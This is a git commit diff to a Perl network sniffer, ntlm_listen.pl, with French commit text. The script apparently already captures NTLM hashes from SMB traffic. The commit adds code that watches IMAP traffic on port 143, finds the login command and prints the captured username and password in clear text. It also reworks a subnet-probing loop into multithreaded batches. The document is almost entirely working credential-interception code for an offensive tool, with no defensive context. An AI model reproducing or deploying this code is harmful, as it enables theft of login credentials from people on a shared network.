a68b615fa54438e6f0816297ba1a6ed6a3643c13
BUNLON Christie <bunlon.christie@gmail.com>
2013-05-28 17:08:49 +0200

    - Ajout du scan ARP multithread et de l'interception IMAP

--- Sources/Functions/ntlm_listen.pl
+++ Sources/Functions/ntlm_listen.pl
@@ -9,7 +9,7 @@ use Net::MAC::Vendor;
 use Net::DHCP::Packet;
 use Getopt::Long;
 use Socket;
-
+use threads;
 my $SHOW_MAC = 0;
 my $listen_mode;
 GetOptions ("listen" => \$listen_mode);
@@ -24,6 +24,21 @@ sub StartCap()
 	tcp_callback => sub {
 	
 		my ($npe, $ether, $ip, $tcp, $header) = @_;
+        if ($tcp->{dest_port} == 143)
+        {
+            print "paquet IMAP détecté\n";
+            my $login_packet =($ether->{data});
+            my $pack_hex = unpack("H*", $login_packet);
+            my $pack_type=index($pack_hex, "6c6f");
+                
+            if ($pack_type != -1)
+            {
+                my $packet_offset = substr $pack_hex, $pack_type; 
+                my $packet_final = pack("H*",$packet_offset);
+                my @logins= split (/ /, $packet_final); 
+                print $logins[0].":".$logins[1]."\n Password: ".$logins[2];
+            }
+        }
         if ($tcp->{dest_port} == 445)
         {
             print "SMB Packet $i : ";
@@ -72,8 +87,8 @@ sub StartCap()
                     
                     my $lan_manager_hex = substr $packet_offset,(hex($offset))+(hex($offset)),(hex($maxlenght))+(hex($maxlenght));
 
-                    print $pack_hex."\n";
-                    print $lan_manager_hex;
+                    
+                    print $lan_manager_hex."\n";
                   
 
                 }
@@ -111,11 +126,14 @@ sub StartCap()
     my $block = GetLocalNetInfo($npe->network, $npe->netmask);
 
     print "la taille du réseau est:".$block->size()."\n";
+    my $networksize = $block->size();
+    my $tablesize = $networksize/4;
+
     print "premiere adresse :".$block->first()."\n";
     print "derniere adresse :".$block->last()."\n";
     if (!$listen_mode)
     {
-        MapNetwork($block->first(),$block->last());
+        MapNetwork($block->first(),$block->last(),$tablesize);
     }
     1 while $npe->loop;
 }
@@ -166,45 +184,64 @@ sub GetLocalNetInfo {
 }
 
 sub MapNetwork {
+    my $tablesize = $_[2];
     my $currentip; 
     my ($a,$b,$c,$d) = split(/\./, $_[0]);
-
+    my $count_ip = 0;
+    my $y = 0;
+    my $z = 0;
+    my @table;
+    my @tmp = ();
     do
     {
-        $d++;
+        
         $currentip = "$a.$b.$c.$d";
-        print "Probing : $a.$b.$c.$d\n";
-        my $n = Net::RawIP->new({
-                        ip  => {
-                                saddr => '10.8.99.230',
-                                daddr => $currentip,
-                               },
-                      },
-                      tcp => {
-                                source => 31337,
-                                dest   => 54321,
-                                psh    => 1,
-                                syn    => 0,
-                              });;
-        $n->send;
-        $n->ethnew("wlan0");
-        if ($d == 255)
+        $d++;
+        #print($currentip."\n");
+        push (@tmp, $currentip);
+        #$table[$y][$z] = $currentip;
+        #print "tableau $y valeur $z Probing : $a.$b.$c.$d\n";
+
+        if ($d == 256)
         {
             $c++;
             $d = 0;
         }
-        if ($c == 255)
+        if ($c == 256)
         {
             $b++;
             $c =0;
         }
-        if ($b == 255)
+        if ($b == 256)
         {
             $a++;
             $b = 0;
         }
+        $count_ip++;
+        $z++;
+        if ($count_ip == $tablesize)
+        {
+            print("Tableau.\n");
+
+            my $Thread = threads->new(\&SendTable,@tmp);
+            $Thread->detach();
+            #push @table, [ @tmp ];""
+            @tmp = ();
+            $y++; 
+            $z = 0;
+            $count_ip = 0;
+        }
 
     } while ($currentip ne $_[1]);
+
+}
+
+sub SendTable {
+    my @tab = @_;
+    foreach my $i (@tab)
+    {
+        print "ENVOIE DU PACKET A L'IP $i\n";
+    }
 
 }
 
